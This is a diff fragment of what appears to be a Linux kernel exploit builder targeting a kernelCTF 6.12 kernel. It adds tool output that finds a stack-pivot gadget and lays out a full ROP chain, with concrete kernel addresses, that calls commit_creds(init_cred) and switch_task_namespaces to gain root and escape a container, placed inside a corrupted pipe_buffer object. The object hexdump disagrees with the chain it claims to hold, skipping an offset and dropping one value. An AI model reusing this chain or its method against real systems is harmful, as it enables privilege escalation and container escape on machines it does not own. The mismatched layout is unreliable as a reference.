@@ -203,3 +203,89 @@ print("  3. Set fake_ops->release (+0x08) -> 0x{:x}  (pivot gadget)".format(
     payload['func_ptr']))
 print("  4. Embed ROP chain at buf+0x{:x}".format(payload['chain_offset']))
 print("  5. Close pipe fd to trigger pipe_buf_release()")
+
+"""
+// Output from kernelCTF lts-6.12.51
+=== Finding pivot from RSI (pipe_buffer) ===
+
+Best pivot:
+Pivot type: offset
+  Gadget: 0xffffffff815665aa # push rsi ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
+  Source register: rsi
+  Offset: 0x18
+  ROP chain starts at [rsi+0x18]
+
+=== Building escape chain ===
+
+[*] commit_creds(init_cred)
+$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
+$RSP+0x0008 : 0xffffffff840953a0
+$RSP+0x0010 : 0xffffffff811e37d0
+
+
+[*] find_task_by_vpid(1)
+$RSP+0x0000 : 0xffffffff815cd6ad # mov edi, 1 ; mov eax, edi ; ret
+$RSP+0x0008 : 0xffffffff811d6c00
+
+
+[*] switch_task_namespaces(rax, init_nsproxy)
+$RSP+0x0000 : 0xffffffff8243485a # push rax ; add eax, ebp ; pop rdi ; ret
+$RSP+0x0008 : 0xffffffff8115fbce # pop rsi ; ret
+$RSP+0x0010 : 0xffffffff84094e80
+$RSP+0x0018 : 0xffffffff811e16d0
+
+
+[*] fork()
+$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
+$RSP+0x0008 : 0x0000000000000000
+$RSP+0x0010 : 0xffffffff811a6440
+
+
+[*] msleep(1000000000)
+$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
+$RSP+0x0008 : 0x000000003b9aca00
+$RSP+0x0010 : 0xffffffff812732f0
+
+
+=== Full ROP chain ===
+
+$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
+$RSP+0x0008 : 0xffffffff840953a0
+$RSP+0x0010 : 0xffffffff811e37d0
+$RSP+0x0018 : 0xffffffff815cd6ad # mov edi, 1 ; mov eax, edi ; ret
+$RSP+0x0020 : 0xffffffff811d6c00
+$RSP+0x0028 : 0xffffffff8243485a # push rax ; add eax, ebp ; pop rdi ; ret
+$RSP+0x0030 : 0xffffffff8115fbce # pop rsi ; ret
+$RSP+0x0038 : 0xffffffff84094e80
+$RSP+0x0040 : 0xffffffff811e16d0
+$RSP+0x0048 : 0xffffffff81177704 # pop rdi ; ret
+$RSP+0x0050 : 0x0000000000000000
+$RSP+0x0058 : 0xffffffff811a6440
+$RSP+0x0060 : 0xffffffff81177704 # pop rdi ; ret
+$RSP+0x0068 : 0x000000003b9aca00
+$RSP+0x0070 : 0xffffffff812732f0
+
+
+=== pipe_buffer object layout ===
+
+Place ROP chain at object+0x18
+Chain offset: 0x18
+Total object size: 0x100 bytes
+
+Object hexdump:
+  +0x0010: 0x0000000000000000  <-- buf->ops (reserved)
+  +0x0018: 0xffffffff81177704  <-- ROP chain start
+  +0x0020: 0xffffffff840953a0
+  +0x0028: 0xffffffff811e37d0
+  +0x0030: 0xffffffff815cd6ad
+  +0x0038: 0xffffffff811d6c00
+  +0x0040: 0xffffffff8243485a
+  +0x0048: 0xffffffff8115fbce
+  +0x0050: 0xffffffff84094e80
+  +0x0058: 0xffffffff811e16d0
+  +0x0060: 0xffffffff81177704
+  +0x0070: 0xffffffff811a6440
+  +0x0078: 0xffffffff81177704
+  +0x0080: 0x000000003b9aca00
+  +0x0088: 0xffffffff812732f0
+"""
